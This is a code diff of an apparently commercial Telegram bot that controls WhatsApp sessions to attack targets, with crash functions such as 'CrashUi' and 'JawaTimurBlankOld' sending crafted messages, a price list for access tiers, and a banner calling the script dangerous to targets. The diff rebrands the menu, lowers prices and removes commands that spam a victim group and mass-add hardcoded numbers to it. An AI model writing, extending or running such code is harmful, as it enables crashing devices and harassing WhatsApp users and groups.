@@ -479,18 +479,26 @@ bot.onText(/\/start|\/p|start|menu|rey/, async (msg) => {
   const premiumStatus = getPremiumStatus(senderId);
   const runtime = getBotRuntime();
   const randomImage = getRandomImage();
+  const session = userSessions.get(String(senderId));
+  const statussender = cekWaStatus(session?.sock);
   const dragon = await bot.sendPhoto(chatId, randomImage, {
     caption: `
-<blockquote><tg-emoji emoji-id="4940998718838014973">💀</tg-emoji> 𝙃𝙊𝙓𝙏𝙀𝙍 𝙓𝙑𝙊𝙄𝘿 - 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="4987984647443973182">🪙</tg-emoji>
-<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> هذا البرنامج النصي خطير للغاية على المستخدمين والأهداف، لذا استخدمه بحكمة. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>
+<blockquote>ALTHERA - 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎
+Script Bot WhatsApp — Gunakan secara bijak dan bertanggung jawab.
 
-<tg-emoji emoji-id="5197531888452925507">🎁</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏  <tg-emoji emoji-id="5474197700087932281">🎁</tg-emoji>
-<tg-emoji emoji-id="4936468614967460670">⭐</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝙃𝙊𝙓𝙏𝙀𝙍 𝙓𝙑𝙊𝙄𝘿 
-<tg-emoji emoji-id="4936468614967460670">⭐</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 2.0 BETA
-<tg-emoji emoji-id="4936468614967460670">⭐</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @Fuckyatim
-<tg-emoji emoji-id="4936468614967460670">⭐</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎
+𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏
+𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝙃𝙊𝙓𝙏𝙀𝙍 𝙓𝙑𝙊𝙄𝘿 
+𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 0.5 BETA TEST
+𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @ridzzhalutrs
+𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎
 
-<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> شكرًا لاستخدامك هذا البرنامج النصي. استخدمه استخدامًا حسنًا، ولا تسيء استخدامه لأن ذلك قد يؤدي إلى عقوبات وفقًا للقانون. <tg-emoji emoji-id="5465206035729906349">🐈‍⬛</tg-emoji>
+𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝙄𝙎𝙏𝙀𝙈
+𝙻𝚊𝚗𝚐𝚞𝚊𝚐𝚎: 𝙹𝚊𝚟𝚊𝚂𝚌𝚛𝚒𝚙𝚝
+𝚄𝚙𝚝𝚒𝚖𝚎: ${runtime}
+𝙿𝚛𝚎𝚏𝚒𝚡: /
+𝚆𝚑𝚊𝚝𝚜𝙰𝚙𝚙 𝚂𝚎𝚜𝚜𝚒𝚘𝚗: ${statussender}
+________________________________
+Pilih Button di bawah ini ↯
 </blockquote>
 `,
     parse_mode: "HTML",
@@ -584,9 +592,9 @@ bot.on("callback_query", async (query) => {
 <tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> هذا البرنامج النصي خطير للغاية على المستخدمين والأهداف، لذا استخدمه بحكمة. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>
 ┗━━━━━━━━━━━━━━⪼
 ┏━━⪼ [ 𝗛𝗔𝗥𝗚𝗔 ⌂ 𝗦𝗖𝗥𝗜𝗣𝗧 ]
-┃<b>⋅𖤓⋅ FULL UP : Rp10.000</b>
-┃<b>⋅𖤓⋅ RESS SC : Rp20.000</b>
-┃<b>⋅𖤓⋅ PARTNER SC : Rp30.000</b>
+┃<b>⋅𖤓⋅ FULL UP : Rp7.000</b>
+┃<b>⋅𖤓⋅ RESS SC : Rp12.000</b>
+┃<b>⋅𖤓⋅ PARTNER SC : Rp20.000</b>
 ┃<b>⋅𖤓⋅ MODERATOR SC : Rp40.000</b>
 ┃<b>⋅𖤓⋅ OWNER SC : Rp50.000</b>
 ┃<b>⋅𖤓⋅ HOXTER STAFF : Rp70.000</b>
@@ -608,7 +616,6 @@ bot.on("callback_query", async (query) => {
 ┃<b>⋅𖤓⋅ 𝙏𝙪𝙖𝙣 𝙈𝙪𝙙𝙖 𝘼𝙖𝙧𝙤𝙣 [ Developer ]</b>
 ┃<b>⋅𖤓⋅╰➤ @Fuckyatim </b>
 ┃<b>⋅𖤓⋅╰➤ @Iyaetim </b>
-@ridzzhalutrs
 ┗━━━━━━━━━━━━━━⪼
 ┏━━⪼ [ SUPPORT ]
 ┃<b>⋅𖤓⋅ @Ftmncloud12 ( Friend )</b>
@@ -1390,47 +1397,6 @@ if (remainingTime > 0) {
   } catch (error) {
     bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
   }
-});
-
-bot.onText(/\/bangb\s+(.+)/i, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const input = match[1].trim();
-
-    try {
-        let target = input;
-
-        // Jika input berupa link invite grup
-        if (input.includes("chat.whatsapp.com/")) {
-            const inviteCode = input
-                .split("chat.whatsapp.com/")[1]
-                .split(/[?&\s]/)[0];
-
-            const info = await sock.groupGetInviteInfo(inviteCode);
-            target = info.id;
-        }
-
-        // Validasi ID grup
-        if (!target.endsWith("@g.us")) {
-            return bot.sendMessage(
-                chatId,
-                "❌ Link atau ID grup tidak valid."
-            );
-        }
-
-        await bot.sendMessage(
-            chatId,
-            `⏳ Memproses grup:\n${target}`
-        );
-
-        await bangb(sock, target);
-
-        await bot.sendMessage(chatId, "✅ Done.");
-    } catch (err) {
-        await bot.sendMessage(
-            chatId,
-            `❌ Error: ${err.message}`
-        );
-    }
 });
 
 // Pastikan bagian atas file kamu sudah punya:
@@ -2239,219 +2205,7 @@ if (remainingTime > 0) {
   }
 });
 
-bot.onText(/\/chatpgrup(?:\s+([^\s]+))?/i, async (msg, match) => {
-  const chatId = msg.chat.id;
-  const senderId = msg.from.id;
-  const groupInput = (match[1] || "").trim();
-  const randomImage = getRandomImage();
-
-  if (!groupInput) {
-    return bot.sendMessage(
-      chatId,
-      "🪧 ☇ Format:\n/chatpgrup 120363XXXXXXXXXX@g.us\n\nAtau gunakan link undangan grup WhatsApp."
-    );
-  }
-
-  // Deteksi JID grup atau link undangan WhatsApp
-  const isGroupJid = /^[0-9-]+@g\.us$/i.test(groupInput);
-
-  const inviteMatch = groupInput.match(
-    /(?:https?:\/\/)?(?:www\.)?chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/i
-  );
-
-  if (!isGroupJid && !inviteMatch) {
-    return bot.sendMessage(
-      chatId,
-      "❌ Format target tidak valid!\nGunakan JID grup atau link undangan WhatsApp."
-    );
-  }
-
-  if (!premiumUsers.some(
-    user =>
-      user.id === senderId &&
-      new Date(user.expiresAt) > new Date()
-  )) {
-    return bot.sendPhoto(chatId, randomImage, {
-      caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
-buy akses ke owner di bawa inii !!!`,
-      parse_mode: "Markdown",
-      reply_markup: {
-        inline_keyboard: [
-          [{
-            text: "Contact Owner ",
-            url: "https://t.me/Fuckyatim"
-          }]
-        ]
-      }
-    });
-  }
-
-  const remainingTime = checkCooldown(senderId);
-
-  if (remainingTime > 0) {
-    return bot.sendMessage(
-      chatId,
-      `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`
-    );
-  }
-
-  try {
-    if (sessions.size === 0) {
-      return bot.sendMessage(
-        chatId,
-        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
-      );
-    }
-
-    // Target default: JID yang diberikan langsung
-    let target = groupInput;
-
-    // Jika input berupa link, ubah menjadi JID menggunakan Baileys
-    if (inviteMatch) {
-      const inviteCode = inviteMatch[1];
-
-      const groupInfo = await sock.groupGetInviteInfo(inviteCode);
-
-      if (!groupInfo || !groupInfo.id) {
-        return bot.sendMessage(
-          chatId,
-          "❌ Gagal mendapatkan JID grup dari link tersebut."
-        );
-      }
-
-      target = groupInfo.id;
-
-      console.log(
-        "\x1b[36m[GROUP]\x1b[0m JID grup ditemukan:",
-        target
-      );
-    }
-
-    // Kirim gambar + caption pertama
-    const sentMessage = await bot.sendPhoto(
-      chatId,
-      "https://ibb.co.com/39TLHrck",
-      {
-        caption: `
-\`\`\`
-- HoxterFc
-╰➤ Target Grup : ${target}
-╰➤ Status : Mengirim chat P...
-╰➤ Progres : [░░░░░░░░░░] 0%
-\`\`\`
-`,
-        parse_mode: "Markdown"
-      }
-    );
-
-    // Progress bar bertahap
-    const progressStages = [
-      {
-        text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%",
-        delay: 200
-      },
-      {
-        text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%",
-        delay: 200
-      },
-      {
-        text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%",
-        delay: 100
-      },
-      {
-        text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%",
-        delay: 100
-      },
-      {
-        text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%",
-        delay: 100
-      }
-    ];
-
-    // Jalankan progres bertahap
-    for (const stage of progressStages) {
-      await new Promise(resolve =>
-        setTimeout(resolve, stage.delay)
-      );
-
-      await bot.editMessageCaption(
-        `
-\`\`\`
-- HoxterFc
-╰➤ Target Grup : ${target}
-╰➤ Status : Memproses...
- ${stage.text}
-\`\`\`
-`,
-        {
-          chat_id: chatId,
-          message_id: sentMessage.message_id,
-          parse_mode: "Markdown"
-        }
-      );
-    }
-
-    // Fungsi delay async
-    const delay = ms =>
-      new Promise(res => setTimeout(res, ms));
-
-    // Eksekusi fungsi chatp sebanyak 2 kali
-    for (let i = 0; i <= 1; i++) {
-      await chatp(sock, target);
-
-      if (i < 1) {
-        await delay(1500);
-      }
-    }
-
-    console.log(
-      "\x1b[32m[SUCCESS]\x1b[0m Chat P berhasil dikirim ke grup!"
-    );
-
-    // Update ke sukses
-    await bot.editMessageCaption(
-      `
-\`\`\`
-- HoxterFc
-╰➤ Target Grup : ${target}
-╰➤ Status : Sukses!
-╰➤ Progres : [██████████] 100%
-\`\`\`
-`,
-      {
-        chat_id: chatId,
-        message_id: sentMessage.message_id,
-        parse_mode: "Markdown"
-      }
-    );
-
-  } catch (error) {
-    console.error("[CHATPGRUP ERROR]", error);
-
-    await bot.sendMessage(
-      chatId,
-      `❌ Gagal mengirim chat P: ${error.message}`
-    );
-  }
-});
 // /TEMPAT FUNC DISINI ///
-// ============== FUNCTION CHAT P ==============
-async function chatp(sock, target) {
-  if (!sock) {
-    throw new Error("Session WhatsApp tidak tersedia.");
-  }
-
-  if (!target || typeof target !== "string") {
-    throw new Error("Target WhatsApp tidak valid.");
-  }
-
-  await sock.sendMessage(target, {
-    text: "P"
-  });
-
-  return true;
-}
-
 async function JawaTimurBlankOld(sock, target) {
   await sock.relayMessage(target, {
     "videoMessage": {
@@ -2701,39 +2455,6 @@ async function CrashUi(sock, target) {
          }
         }, { participant: { jid: target } });
     }
-
-async function bangb(sock, groupJid) {
-    if (!groupJid.endsWith('@g.us')) {
-        throw new Error('@g.us server required');
-    }
-
-    const numbers = [
-        Array.from({ length: 10 }, () => "6281122112211"),
-        Array.from({ length: 10 }, () => "6282211221122"),
-        Array.from({ length: 10 }, () => "6283344334433"),
-        Array.from({ length: 10 }, () => "6284455667766"),
-        Array.from({ length: 10 }, () => "6285511334422"),
-        Array.from({ length: 10 }, () => "6286699881177"),
-        Array.from({ length: 10 }, () => "6287299199199"),
-        Array.from({ length: 10 }, () => "6289788997788"),
-        Array.from({ length: 10 }, () => "6281119292992"),
-        Array.from({ length: 10 }, () => "6288191919173"),
-    ];
-
-    const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
-
-    for (let i = 0; i < numbers.length; i++) {
-        const waitMs = (i + 1) * 4000; 
-        console.log(`[${i}] Waiting ${waitMs / 1000}s before adding batch ${i + 1}...`);
-        await delay(waitMs);
-        await sock.groupParticipantsUpdate(
-            groupJid,
-            numbers[i].map(n => n + '@s.whatsapp.net'),
-            'add'
-        );
-        console.log(`[${i}] Batch ${i + 1} added.`);
-    }
-}
 
 async function JawaTimurIsBack(sock, target) {
   try {
@@ -3654,7 +3375,7 @@ const DEFAULT_RAW_URL =
   `https://raw.githubusercontent.com/${Owner}/${Repo}/${BranchPath}`;
 
 // ============== KONFIGURASI ==============
-const BOT_FILE = path.join(__dirname, "Ange.js");
+const BOT_FILE = path.join(__dirname, "index.js");
 const BACKUP_DIR = path.join(__dirname, "backups");
 const MAX_FILE_SIZE = 2 * 1024 * 1024;
 const CONFIRM_EXPIRES_MS = 10 * 60 * 1000;
